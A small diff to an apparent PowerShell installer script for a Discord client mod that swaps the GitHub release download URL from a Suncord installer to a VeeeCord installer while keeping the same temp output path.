@@ -1,4 +1,4 @@
-$link = "https://github.com/verticalsync/SuncordInstaller/releases/latest/download/SuncordInstallerCli.exe"
+$link = "https://github.com/gujarathisampath/VeeeCordInstaller/releases/latest/download/VeeeCordInstallerCli.exe"
 
 $outfile = "$env:TEMP\VencordInstallerCli.exe"
 
